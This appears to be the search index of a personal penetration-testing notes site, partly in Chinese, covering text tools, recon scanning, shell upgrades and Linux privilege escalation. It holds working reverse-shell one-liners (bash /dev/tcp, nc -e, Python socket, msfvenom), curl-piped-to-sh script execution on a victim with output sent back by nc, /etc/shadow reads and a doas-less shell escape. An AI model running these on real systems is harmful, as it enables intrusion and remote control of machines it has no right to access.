{"config":{"lang":["en"],"separator":"[\\s\\-]+","pipeline":["stopWordFilter"]},"docs":[{"location":"","title":"Environment Configuration","text":"<ul> <li>ida pro</li> <li>x96dbg</li> <li>010editor</li> <li>vmware workstation<ul> <li>windows</li> <li>kali linux</li> </ul> </li> <li>visual studio 2017<ul> <li>microsoft runtime library</li> </ul> </li> <li>clion</li> <li>pycharm</li> </ul>"},{"location":"Crypto/","title":"Index","text":"<p>All things about cryptography in red teaming.</p>"},{"location":"Crypto/#online-tools","title":"Online tools","text":"<ul> <li>CrackStation</li> <li>CyberChef</li> </ul>"},{"location":"Linux/","title":"Details","text":"<p>regular expression</p> <p>manipulate text:</p> <ul> <li> grep</li> <li> sed</li> <li> awk</li> </ul> <p>shell:</p> <ul> <li>unlisted</li> </ul>"},{"location":"Linux/regexp/","title":"Regular Expression","text":"<p>Online editor:</p> <ul> <li>regexr (Left Q: how to deploy this tool on Github page.)</li> </ul>"},{"location":"Linux/regexp/#basic-regexp","title":"Basic regexp","text":"<ul> <li>\u5339\u914d\u5b57\u7b26</li> <li>\u5339\u914d\u6b21\u6570</li> <li>\u4f4d\u7f6e\u951a\u5b9a</li> </ul> \u7b26\u53f7 \u4f5c\u7528 ^ \u5339\u914d\u884c\u5f00\u5934 $ \u5339\u914d\u884c\u7ed3\u5c3e ^$ \u7a7a\u884c . \u5339\u914d\u4e00\u4e2a\u5b57\u7b26 \\ \u8f6c\u4e49\u5b57\u7b26 * \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u53ca\u4ee5\u4e0a .* \u5339\u914d\u6240\u6709\u5185\u5bb9 ^.* \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u5f00\u5934\u7684\u5185\u5bb9 .*$ \u5339\u914d\u4efb\u610f\u591a\u4e2a\u5b57\u7b26\u7ed3\u5c3e\u7684\u5185\u5bb9 [abc] \u5339\u914d\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26 [^abc] \u5339\u914d\u9664\u4e86\u96c6\u5408\u5185\u4efb\u610f\u4e00\u4e2a\u5b57\u7b26"},{"location":"Linux/regexp/#extensive-regexp","title":"Extensive regexp","text":"<p><code>grep -E</code></p> \u7b26\u53f7 \u4f5c\u7528 + \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b261\u6b21\u53ca\u4ee5\u4e0a ? \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b260\u6b21\u62161\u6b21 | \u6216\u8005 () \u5206\u7ec4\u8fc7\u6ee4\uff0c\u5206\u7ec4\u7684\u5185\u5bb9\u53ef\u540e\u7eed\"\\n\"\u5f15\u7528 a{n} a{n,m} a{n,} a{,m} \u5339\u914d\u524d\u4e00\u4e2a\u5b57\u7b26\u7279\u5b9a\u6b21\u6570"},{"location":"Linux/manipulate_text/awk/","title":"awk","text":""},{"location":"Linux/manipulate_text/awk/#synopsis","title":"SYNOPSIS","text":"<pre><code>awk [-W option] [-F value] [-v var=value] [--] 'program text' [file ...]\nawk [-W option] [-F value] [-v var=value] [-f program-file] [--] [file ...]\n</code></pre> <p>\u7b2cn\u5217\u7684\u4fe1\u606f</p> <ul> <li><code>$0</code></li> <li><code>$1</code>, <code>$2</code>, \u2026</li> <li>\u2026, <code>$(NF-1)</code>, <code>$NF</code></li> </ul> <p>\u5206\u5272\u7b26</p> <ul> <li>\u8f93\u5165\u5206\u9694\u7b26\uff1a\u9ed8\u8ba4\u7a7a\u683c\uff0c\u53d8\u91cf\u540dFS(Field Seperator)</li> <li>\u8f93\u51fa\u5206\u9694\u7b26\uff1aOFS(Output Field Seperator)</li> </ul> <pre><code>awk -F \":\" '{print $1, $2}' filename\nawk -v FS=\":\" '{print $1, $2}' filename\nawk -v OFS=\"-\" '{print $1, $2}' filename\nawk 'BEGIN {OFS=\",\"} {print $1, $2}' filename\n</code></pre>"},{"location":"Linux/manipulate_text/awk/#option","title":"Option","text":"option usage -F val FS, field separator -v var=val assign val to program variable var -f file program text is read from file -- indicate unambiguous end of opts"},{"location":"Linux/manipulate_text/awk/#program-variable","title":"Program variable","text":"Program variable Usage FS Field separator, ' ' OFS Output field separator, ' ' RS Record separator, initially '\\n' ORS Output record separator, '\\n' NF Number of field NR Number of record FNR File number of record FILENAME Current filename ARGC arg count ARGV arg vector"},{"location":"Linux/manipulate_text/awk/#program-structure","title":"Program structure","text":"<p>Program = sequence of pattern {action} pairs and user function definitions</p> <p>Pattern:</p> <ul> <li>BEGIN</li> <li>END</li> <li>expr</li> <li>expr, expr</li> </ul>"},{"location":"Linux/manipulate_text/grep/","title":"grep","text":"<p>SYNOPSIS</p> <pre><code>grep [opts] [pattern] file\n    -i: ignore\n    -o: only print matched\n    -v, --invert-match\n    -E: enable regexp\n    -q, --quite, --silent\n    -n: number line\n    -c: count output line\n</code></pre>"},{"location":"Linux/manipulate_text/sed/","title":"sed","text":"<p>SYNOPSIS</p> <pre><code>sed [opts] [cmd chars] [file]\n</code></pre> <p>Opts</p> \u53c2\u6570 \u4f5c\u7528 -n \u53d6\u6d88\u9ed8\u8ba4\u7684sed\u8f93\u51fa\uff0c\u5e38\u4e0ep\u4e00\u8d77\u4f7f\u7528 -i \u4fee\u6539\u7ed3\u679c\u76f4\u63a5\u5199\u5165\u6587\u4ef6 -e \u591a\u6b21\u7f16\u8f91\uff08\u4e0d\u9002\u7528\u7ba1\u9053\u7b26\uff09 -r \u6269\u5c55\u7248\u6b63\u5219 <p>\u5185\u7f6e\u547d\u4ee4\u5b57\u7b26</p> sed\u5185\u7f6e \u4f5c\u7528 a append\uff0c\u6307\u5b9a\u884c\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c d delete\uff0c\u5220\u9664\u5339\u914d\u884c i insert\uff0c\u6307\u5b9a\u884c\u524d\u6dfb\u52a0\u4e00\u884c\u53ca\u4ee5\u4e0a\u6587\u672c p print\uff0c\u6253\u5370\u5339\u914d\u884c\u5185\u5bb9 s/regexp/text/g \u5339\u914d\u6b63\u5219\u5185\u5bb9\uff0c\u66ff\u6362\u5185\u5bb9\uff0cg\u5168\u5c40\u5339\u914d <p>\u5339\u914d\u8303\u56f4</p> \u8303\u56f4 \u89e3\u6790 \u7a7a\u5730\u5740 \u5168\u6587\u5904\u7406 \u5355\u5730\u5740 \u6307\u5b9a\u6587\u4ef6\u67d0\u4e00\u884c /pattern/ \u88ab\u6a21\u5f0f\u5339\u914d\u5230\u7684\u6bcf\u4e00\u884c \u8303\u56f4\u533a\u95f4 10,20 10,+5 /pattern1/,/pattern2/ \u6b65\u957f 1~2, 2~2, start~step"},{"location":"Pentest/","title":"Details","text":"<p>Core pentest procedures:</p> <ul> <li>Reconnaissance</li> <li>Vulnerabilities</li> <li>Services</li> <li>Privilege Escalation<ul> <li>Linux</li> <li>Windows</li> </ul> </li> </ul> <p>Auxiliary points:</p> <ul> <li>Reverse shell</li> <li>Quick server</li> </ul>"},{"location":"Pentest/#helper-tools","title":"Helper tools","text":"<ul> <li>arsenal, <code>pip install arsenal-cli</code></li> </ul>"},{"location":"Pentest/1.recon/","title":"Index","text":"<ul> <li>nmap</li> </ul> <pre><code>nmap -sn &lt;ip&gt;/24 # arp, arp-scan -l\nnmap -sn --send-ip &lt;ip&gt;/24 # icmp\nnmap -sT --min-rate 10000 -p- &lt;ip&gt; -oA &lt;ports&gt; # | grep open | awk -F '/' '{print $1}' | paste -sd ','\n\nnmap -sT -sV -sC -O -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\nnmap -sU --top-ports 20 &lt;ip&gt; -oA &lt;file&gt;\nnmap --script=vuln -p&lt;ports&gt; &lt;ip&gt; -oA &lt;file&gt;\n\nnmap -6 --min-rate 10000 -p- &lt;ip&gt; -oA &lt;file&gt;\n</code></pre> <ul> <li>searchsploit</li> </ul> <pre><code>searchsploit &lt;dsc&gt;\nsearchsploit &lt;dsc&gt; -m &lt;num&gt;\n</code></pre>"},{"location":"Pentest/1.recon/cdn/","title":"CDN","text":"<ul> <li>online ping<ul> <li>http://ping.chinaz.com/</li> <li>http://ping.aizhan.com/</li> <li>http://ce.cloud.360.cn/</li> <li>https://ip.tool.chinaz.com/</li> <li>https://get-site-ip.com/</li> <li>https://tools.ipip.net/cdn.php/</li> </ul> </li> <li>nslookup"},{"location":"Pentest/1.recon/dns/","title":"DNS","text":"<ul> <li>local host config<ul> <li>linux/unix/macos: <code>/etc/resolv.conf</code></li> <li>windows: <code>%windir%\\system32\\drivers\\etc\\hosts</code></li> </ul> </li> <li>dig <pre><code>dig @&lt;dns&gt; &lt;domain&gt; [+short]\n</code></pre></li> <li>nslookup <pre><code>nslookup [-qt=A|AAAA|CNAME|MX|.] &lt;target.com&gt; &lt;dns&gt;\n</code></pre></li> <li>whois <pre><code>whois &lt;target.com&gt;\n</code></pre></li> <li>theHaverster<ul> <li>email</li> <li>subdomain</li> <li>name <pre><code>theHarvester -d $DOMAIN_NAME -b google\n</code></pre></li> </ul> </li> <li>crt.sh</li> </ul>"},{"location":"Pentest/1.recon/dns/#domain","title":"Domain","text":"<ul> <li>netcraft: search web by domain</li> </ul>"},{"location":"Pentest/1.recon/dns/#subdomain","title":"Subdomain","text":"<ul> <li>gobuster <pre><code># fzf-wordlists\n/usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt\n# gobuster\ngobuster dns   -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\ngobuster vhost -u &lt;http://target.com&gt; -w /path/to/wordlist.txt --append-domain -t $THREAD_NUM\n</code></pre></li> </ul>"},{"location":"Pentest/1.recon/os/","title":"OS","text":"<ul> <li>web yes<ul> <li>Windows\u5927\u5c0f\u5199\u4e0d\u654f\u611f</li> <li>\u5de5\u5177\u8bc6\u522b</li> </ul> </li> <li>web no<ul> <li>nmap -O</li> </ul> </li> <li>TTL (not accurate)</li> </ul> <pre><code>1\u3001WINDOWS NT/2000   TTL\uff1a128\n2\u3001WINDOWS 95/98     TTL\uff1a32\n3\u3001UNIX              TTL\uff1a255\n4\u3001LINUX             TTL\uff1a64\n5\u3001WIN7              TTL\uff1a64\n</code></pre> <ul> <li>special port: 22, 139, 445, 1433, 3389</li> </ul>"},{"location":"Pentest/1.recon/path/","title":"Path","text":""},{"location":"Pentest/1.recon/path/#methodology","title":"Methodology","text":"<ul> <li>directory</li> <li>file</li> </ul>"},{"location":"Pentest/1.recon/path/#tools","title":"Tools","text":"<ul> <li>gobuster</li> </ul> <pre><code>sudo gobuster dir -u &lt;ip&gt; --worlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.t -x html,php\n</code></pre> <ul> <li>dirb</li> </ul> <pre><code>dirb &lt;ip&gt;\n</code></pre> <ul> <li>dirsearch</li> </ul> <pre><code>dirsearch -u &lt;ip&gt; -e &lt;ext&gt; [opts]\n\n-t &lt;thead&gt;\n-r, brute-force recursively\n-i &lt;code&gt;, include status codes\n-x &lt;codes&gt;, exclude status codes\n-m &lt;method&gt;\n-d &lt;data&gt;\n-H &lt;headers&gt;\n--user-agent=&lt;ua&gt;\n--cookie=&lt;ck&gt;\n</code></pre> <ul> <li>ffuf</li> </ul> <pre><code>ffuf -fs 185 -c -w \\$(fzf-wordlists) -H 'Host: FUZZ.org' -u \"http://$TARGET/\"\nffuf -w /usr/share/dirb/wordlists/common.txt -fc 403,404 -fs 185 -u \"http://$TARGET/FUZZ\" -p 1\n</code></pre> <ul> <li>wfuzz</li> </ul> <pre><code>wfuzz -c -w &lt;dict&gt; --hc 404 &lt;url&gt;?FUZZ=sth\n</code></pre> <ul> <li>feroxbuster</li> </ul> <pre><code>feroxbuster -u &lt;target.com&gt; -x pdf -w &lt;word&gt; -t 50\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;target.com&gt; -mutate 1 -mutate-options /path/to/dictionary.txt\n</code></pre>"},{"location":"Pentest/1.recon/smb/","title":"SMB","text":"<ul> <li>enum4linux</li> </ul> <pre><code>enum4linux -A &lt;ip&gt;\n</code></pre>"},{"location":"Pentest/1.recon/waf/","title":"WAF","text":"<ul> <li>waf00f</li> <li>identYwaf</li> <li>nmap<ul> <li>nmap --script=http-waf-fingerprint</li> <li>nmap --script=http-waf-detect</li> </ul> </li> </ul>"},{"location":"Pentest/1.recon/web/","title":"Web","text":"<ul> <li>whatweb</li> </ul> <pre><code>whatweb [opts] &lt;urls&gt;\n</code></pre> <ul> <li>nikto</li> </ul> <pre><code>nikto -h &lt;taget&gt; -p &lt;port&gt; -C all [-useproxy &lt;ip:port&gt;] \\\n    [-id admin:passwd] [-Plugins +apacheversion] [-ssl] -o &lt;output&gt;\n</code></pre>"},{"location":"Pentest/2.0.better_shell/","title":"Index","text":"<pre><code># Host\nrlwrap nc -lvnp 4444\n# Remote\nexport TERM=xterm-color\ndpkg -l | grep python\npython -c 'import pty;pty.spawn(\"/bin/bash\")'\n\n##ctrl+z\nstty raw -echo; fg; reset # back to remote\nstty columns 200 rows 200\n\n# Path and alias\nexport PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/tmp\nalias ll='clear ; ls -lsaht --color=auto'\n</code></pre>"},{"location":"Pentest/2.rshell/","title":"Online help","text":"<p>Online rshell</p> <ul> <li>Reverse Shell Generator (revshells.com)</li> </ul> <p>Online shell check</p> <ul> <li>ShellCheck \u2013 shell script analysis tool</li> <li>explainshell.com - match command-line arguments to their help text</li> </ul>"},{"location":"Pentest/2.rshell/#reverse-shell","title":"Reverse Shell","text":"<p>msf gen</p> <p><pre><code>msfvenom -p cmd/unix/reverse_python lhost=&lt;ip&gt; lport=&lt;port&gt; -f raw\nmsfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;Host&gt; LPORT=&lt;p&gt; -f elf -o rshell.elf\n</code></pre> several langs</p> <pre><code>bash -i &gt;&amp; /dev/tcp/&lt;local&gt;/2233 0&gt;&amp;1\n\nnc -e /bin/sh &lt;host&gt; 4444\n\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"10.0.0.1\",1234));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\n</code></pre>"},{"location":"Pentest/2.rshell/detail_of_bash_rshell/","title":"Detail of bash rshell","text":"<pre><code>bash -c 'bash -i &gt;&amp; /dev/tcp/&lt;host&gt;/1234 0&gt;&amp;1'\n</code></pre> <p>\u5728 Bash \u4e2d\uff0c<code>&gt;&amp;</code> \u662f\u4e00\u79cd\u91cd\u5b9a\u5411\u64cd\u4f5c\u7b26\uff0c\u7528\u4e8e\u5c06\u6807\u51c6\u8f93\u51fa\uff08stdout\uff09\u548c\u6807\u51c6\u9519\u8bef\uff08stderr\uff09\u91cd\u5b9a\u5411\u5230\u540c\u4e00\u4e2a\u4f4d\u7f6e\u3002</p> <ul> <li><code>bash -i</code>\uff1a\u8fd9\u5c06\u542f\u52a8\u4e00\u4e2a\u4ea4\u4e92\u5f0f\u7684 bash shell</li> <li><code>&gt;&amp; /dev/tcp/&lt;host&gt;/1234</code>\uff1a\u8fd9\u5c06 bash shell \u7684\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230 TCP \u8fde\u63a5 :1234\uff1b\u8fd9\u6837\uff0c\u6240\u6709\u5728 bash shell \u4e2d\u6253\u5370\u7684\u5185\u5bb9\u90fd\u4f1a\u53d1\u9001\u5230\u8fd9\u4e2a TCP \u8fde\u63a5 <li><code>0&gt;&amp;1</code>\uff1a\u8fd9\u5c06 bash shell \u7684\u6807\u51c6\u8f93\u5165\uff08stdin\uff09\u91cd\u5b9a\u5411\u5230\u5f53\u524d\u7684\u6807\u51c6\u8f93\u51fa\uff08\u5373 TCP \u8fde\u63a5 :1234\uff09\u3002\u8fd9\u6837\uff0c\u4ece TCP \u8fde\u63a5\u63a5\u6536\u7684\u6240\u6709\u5185\u5bb9\u90fd\u4f1a\u4f5c\u4e3a bash shell \u7684\u8f93\u5165 <p>\u603b\u7684\u6765\u8bf4\uff0c\u8fd9\u4e2a\u547d\u4ee4\u4f1a\u521b\u5efa\u4e00\u4e2a\u65b0\u7684 bash shell\uff0c\u5e76\u5c06\u5176\u8f93\u5165\u3001\u8f93\u51fa\u548c\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230\u4e00\u4e2a TCP \u8fde\u63a5\u3002\u4ece\u8fd9\u4e2a TCP \u8fde\u63a5\u4e2d\u83b7\u5f97\u7684\u8f93\u51fa\u4f5c\u4e3a shell \u7684\u8f93\u5165\u5e76\u4e14\u6267\u884c\uff0cshell \u6267\u884c\u5f97\u51fa\u7684\u6807\u51c6\u8f93\u51fa\u548c\u6807\u51c6\u9519\u8bef\u90fd\u91cd\u5b9a\u5411\u5230\u6b64 TCP \u8fde\u63a5\u3002</p> <pre><code>rlwrap sudo nc -lvnp 4444\n</code></pre> <p>\u81f3\u4e8e nc -lvnp 1234\uff0c\u8fd9\u662f\u4e00\u4e2a\u4f7f\u7528 nc\uff08netcat\uff09\u547d\u4ee4\u7684\u4f8b\u5b50\u3002nc \u662f\u4e00\u4e2a\u7528\u4e8e\u5904\u7406 TCP \u548c UDP \u8fde\u63a5\u7684\u5de5\u5177\u3002\u5728\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff1a</p> <ul> <li><code>-l</code> \u9009\u9879\u8ba9 nc \u5728\u6307\u5b9a\u7684\u7aef\u53e3\u4e0a\u76d1\u542c\u8fde\u63a5\u3002</li> <li><code>-v</code> \u9009\u9879\u8ba9 nc \u5728\u5efa\u7acb\u8fde\u63a5\u6216\u63a5\u6536\u6570\u636e\u65f6\u63d0\u4f9b\u8be6\u7ec6\u7684\u4fe1\u606f\u3002</li> <li><code>-n</code> \u9009\u9879\u8ba9 nc \u76f4\u63a5\u4f7f\u7528 IP \u5730\u5740\uff0c\u800c\u4e0d\u8fdb\u884c\u57df\u540d\u89e3\u6790\u3002</li> <li><code>-p</code> \u9009\u9879\u540e\u9762\u8ddf\u7684\u662f nc \u8981\u76d1\u542c\u7684\u7aef\u53e3\u53f7\u3002</li> </ul> <p>\u6240\u4ee5\uff0cnc -lvnp 1234 \u547d\u4ee4\u4f1a\u8ba9 nc \u5728\u7aef\u53e3 1234 \u4e0a\u76d1\u542c\u8fde\u63a5\uff0c\u5e76\u5728\u5efa\u7acb\u8fde\u63a5\u6216\u63a5\u6536\u6570\u636e\u65f6\u63d0\u4f9b\u8be6\u7ec6\u7684\u4fe1\u606f\u3002</p>"},{"location":"Pentest/3.quick_server/","title":"Index","text":"<ul> <li>http</li> </ul> <pre><code>python -m http.server 80\n\nphp -S 0:80\n\nruby -run -ehttpd . -p80\n\nperl -MHTTP::Server::Brick -e '$s=HTTP::Server::Brick-&gt;new(port=&gt;80); $s-&gt;mount(\"/\"=&gt;{path=&gt;\".\"}); $s-&gt;start'\n\n# cargo install simple-http-server\nsimple-http-server -p 80\n\n# npm install -g http-server\nhttp-server -p 80\n</code></pre> <ul> <li>smbclient</li> </ul> <pre><code>sudo python /usr/share/doc/python3-impacket/examples/smbserver.py share . # on host\n//&lt;host&gt;/share/nc64.exe -e cmd.exe &lt;remote&gt; 443 # on remote\n</code></pre>"},{"location":"Pentest/4.services/","title":"Index","text":"<p>Common-used services installed for different uses.</p> <ul> <li> SSH</li> <li> WordPress</li> <li> Jetkeins</li> <li> SMB</li> <li> FTP</li> <li> RPC</li> <li> Kerberos</li> </ul>"},{"location":"Pentest/5.vulns/","title":"Index","text":"<p>Vulnerabilities might be used during pentest.</p> <ul> <li> File inclusion</li> <li> SQLi</li> <li> Shellshock</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/","title":"Index","text":"<p>All things about PriEsc on Linux and Windows.</p>"},{"location":"Pentest/6.priviledge_escalation/#priciples","title":"Priciples","text":"<ul> <li>Low privilege modification, high privilege execution;</li> <li>User behavior: Low privilege operations personnel input/store high privilege credentials and related information;</li> <li>Beyond privilege system: Capture/modify credentials and related information at a higher level (in-memory) (e.g. kernel privilege escalation).</li> </ul> <p>\u63d0\u6743\u539f\u7406</p> <ul> <li>\u4f4e\u6743\u9650\u4fee\u6539\uff0c\u9ad8\u6743\u9650\u8fd0\u884c</li> <li>\u7528\u6237\u884c\u4e3a\uff1a\u4f4e\u6743\u9650\u8fd0\u7ef4\u4eba\u5458\u8f93\u5165/\u5b58\u50a8\u9ad8\u6743\u9650\u51ed\u636e\u7b49\u4fe1\u606f</li> <li>\u8d85\u8d8a\u6743\u9650\u4f53\u7cfb\uff1a\u66f4\u4e0a\u5c42\uff08\u5185\u5b58\uff09\u6355\u83b7/\u4fee\u6539\u51ed\u636e\u7b49\u4fe1\u606f\uff08\u5185\u6838\u63d0\u6743\uff09</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#living-off-the-land","title":"Living off the land","text":"<ul> <li>windows: LOLBAS</li> <li>linux: GTFOBins</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#linux-priviledge-mechanism","title":"Linux Priviledge Mechanism","text":"<p>Common mechanism</p> <ul> <li>ugo</li> <li>suid, sgid</li> <li>AppArmor, Selinux</li> <li>ACL</li> </ul> <p>Other mechanism</p> <ul> <li>Grsecurity</li> <li>Pax</li> <li>ExecShield</li> <li>ASLR</li> <li>TOMOYO Linux</li> <li>SMACK</li> <li>Yama</li> <li>CGroups</li> <li>Linux Namespaces</li> <li>StackGuard</li> <li>Proplice</li> <li>seccomp</li> <li>ptrace</li> <li>capsicum</li> <li>Mprotect</li> <li>chroot</li> <li>firejail</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/#windows-priviledge-mechanism","title":"Windows Priviledge Mechanism","text":""},{"location":"Pentest/6.priviledge_escalation/linux_sudo/","title":"Linux Sudo Commands","text":""},{"location":"Pentest/6.priviledge_escalation/linux_sudo/#living-off-the-land","title":"Living off the land","text":"<p>GTFOBins</p>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/","title":"enumeration","text":""},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#manual","title":"manual","text":"<ul> <li>user-related<ul> <li>whoami</li> <li>id</li> <li>id user</li> <li>who</li> <li>w</li> <li>last</li> </ul> </li> <li>system-related<ul> <li>uname -a</li> <li>lsb_release -a</li> <li>cat /proc/version</li> <li>cat /etc/issue</li> <li>hostnamectl, hostname</li> <li>ps -ef, ps aux, ps axjf</li> <li>top -n 1</li> </ul> </li> <li>network-related<ul> <li>ip a, ifconfig</li> <li>ip route, route</li> <li>ip neigh, arp -a</li> <li>netstat -a, netstat -l, netstat -at, netstat -au</li> <li>netstat -s</li> <li>netstat -ano</li> </ul> </li> <li>priviledge-related<ul> <li>sudo -l</li> <li>getcap -r / 2&gt;/dev/null</li> <li>cat /etc/passwd</li> <li>cat /etc/shadow</li> </ul> </li> <li>usage-related<ul> <li>ls -liah</li> <li>history</li> </ul> </li> <li>schedule-joibs<ul> <li>cat /etc/crontab</li> </ul> </li> <li>environment<ul> <li>echo $PATH</li> <li>env</li> <li>which python gcc ruby perl find netcat nc wget curl ftp tmux screen 2&gt;/dev/null</li> </ul> </li> <li>find / -perm -u=s -type f 2&gt;/dev/null</li> <li>find / -writable -type -f -not -path \u201c*path*\u201d 2&gt;/dev/null</li> <li>find / -group grp -type f 2&gt;/dev/null</li> <li>cat /etc/fstab</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#script","title":"script","text":"<ul> <li>PEASS-ng</li> <li>LinEnum</li> <li>linux-smart-enumeration</li> <li>linux-exploit-suggester</li> <li>linuxprivchecker</li> <li>unix-privesc-check</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/1.enumeration/#how-to-use","title":"how to use","text":"<pre><code># from network\ncurl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh\n\n# from local, curl\nsudo python -m http.server 80 # on host\ncurl &lt;host&gt;/linpeas.sh | sh   # on victim\n\n# by nc\nsudo nc -q 5 -lvnp 80 &lt; linpeas.sh # on host\ncat &lt; /dev/tcp/&lt;host&gt;/80 | sh      # on victim\n</code></pre> <pre><code># execute on victim and send output back to host\nnc -lvnp 8899 | tee linpeas.out                # on host\ncurl &lt;host&gt;/linpeas.sh | sh | nc &lt;host&gt; 8899   # on victim\ncat &lt; /dev/tcp/&lt;host&gt;/80 | sh | nc &lt;host&gt; 8899 # on victim\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/","title":"doas related","text":"<p>doas\u53ef\u7528\u4e8eBSD\u7cfbLinux\u53d1\u884c\u7248\uff0c\u63d0\u6743\u601d\u8def\u7c7b\u4f3c\u4e8e <code>sudo -l</code> \u4e2d\u5bfb\u627e\u53ef\u5229\u7528\u7684\u6587\u4ef6</p> <pre><code>find / -perm -u=s -type f 2&gt;/dev/null # /usr/bin/doas\ncat /etc/doas.conf # config file\n</code></pre> <pre><code>permit nopass keepenv user as root cmd /usr/bin/less args /var/log/authlog\n</code></pre> <pre><code>/usr/bin/less /var/log/authlog # enter less\npress v # enter vim mode\n:!/bin/bash\n</code></pre>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/#doas","title":"doas","text":"<p>doas \u662f\u4e00\u4e2a\u7528\u4e8e\u5728 Linux \u7cfb\u7edf\u4e2d\u4ee5\u5176\u4ed6\u7528\u6237\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u7684\u5de5\u5177\u3002\u5b83\u7684\u8bbe\u8ba1\u76ee\u6807\u662f\u63d0\u4f9b\u4e00\u4e2a\u6bd4 sudo \u66f4\u7b80\u5355\u3001\u66f4\u5c0f\u5de7\u7684\u66ff\u4ee3\u54c1\u3002 \u4ee5\u4e0b\u662f doas \u7684\u4e00\u4e9b\u57fa\u672c\u4f7f\u7528\u65b9\u6cd5\uff1a</p> <ul> <li>\u5b89\u88c5\uff1a\u4f60\u53ef\u4ee5\u901a\u8fc7\u4f60\u7684\u5305\u7ba1\u7406\u5668\u6765\u5b89\u88c5 doas\u3002\u4f8b\u5982\uff0c\u5728 Debian \u7cfb\u7edf\u4e2d\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 apt-get install doas \u547d\u4ee4\u6765\u5b89\u88c5\u3002</li> <li>\u914d\u7f6e\uff1adoas \u7684\u914d\u7f6e\u6587\u4ef6\u662f /etc/doas.conf\u3002\u5728\u8fd9\u4e2a\u6587\u4ef6\u4e2d\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u4e9b\u89c4\u5219\u6765\u63a7\u5236\u54ea\u4e9b\u7528\u6237\u53ef\u4ee5\u4f7f\u7528 doas \u6765\u6267\u884c\u54ea\u4e9b\u547d\u4ee4\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u6dfb\u52a0\u4e00\u6761\u89c4\u5219\u6765\u5141\u8bb8 wheel \u7ec4\u4e2d\u7684\u6240\u6709\u7528\u6237\u4ee5\u4efb\u4f55\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u4efb\u4f55\u547d\u4ee4\uff1apermit :wheel\u3002</li> <li>\u4f7f\u7528\uff1a\u4f60\u53ef\u4ee5\u901a\u8fc7\u5728\u547d\u4ee4\u524d\u9762\u6dfb\u52a0 doas \u6765\u4f7f\u7528 doas \u6267\u884c\u547d\u4ee4\u3002\u4f8b\u5982\uff0c\u4f60\u53ef\u4ee5\u4f7f\u7528 doas cmd \u6765\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c cmd \u547d\u4ee4\u3002</li> </ul>"},{"location":"Pentest/6.priviledge_escalation/linux/10.doas/#doasconf","title":"doas.conf","text":"<p>doas \u547d\u4ee4\u7528\u4e8e\u6839\u636e /etc/doas.conf \u914d\u7f6e\u6587\u4ef6\u4e2d\u7684\u89c4\u5219\u4ee5\u5176\u4ed6\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002 /etc/doas.conf \u6587\u4ef6\u4e2d\u7684\u89c4\u5219\u6709\u4ee5\u4e0b\u683c\u5f0f\uff1a</p> <pre><code>permit | deny [options] identity [as target] [cmd command [args...]]\n</code></pre> <p>\u5176\u4e2d\uff1a</p> <ul> <li>permit | deny\uff1a\u8fd9\u662f\u89c4\u5219\u7684\u7c7b\u578b\uff0c\u8868\u793a\u662f\u5426\u5141\u8bb8\uff08permit\uff09\u6216\u62d2\u7edd\uff08deny\uff09\u6267\u884c\u67d0\u4e2a\u64cd\u4f5c\u3002</li> <li>options\uff1a\u8fd9\u662f\u4e00\u4e9b\u53ef\u9009\u7684\u8bbe\u7f6e\uff0c\u4f8b\u5982 nopass\uff08\u65e0\u9700\u5bc6\u7801\uff09\u548c persist\uff08\u6301\u4e45\u5316\uff09\u3002</li> <li>identity\uff1a\u8fd9\u662f\u8981\u6267\u884c\u547d\u4ee4\u7684\u7528\u6237\u7684\u8eab\u4efd\u3002</li> <li>as target\uff1a\u8fd9\u662f\u53ef\u9009\u7684\uff0c\u8868\u793a\u4ee5\u54ea\u4e2a\u7528\u6237\u7684\u8eab\u4efd\u6267\u884c\u547d\u4ee4\u3002</li> <li>cmd command [args...]\uff1a\u8fd9\u662f\u8981\u6267\u884c\u7684\u547d\u4ee4\u548c\u53c2\u6570\u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u53ef\u4ee5\u521b\u5efa\u4e00\u4e2a\u89c4\u5219\uff0c\u5141\u8bb8 wheel \u7ec4\u4e2d\u7684\u6240\u6709\u7528\u6237\u4ee5 root 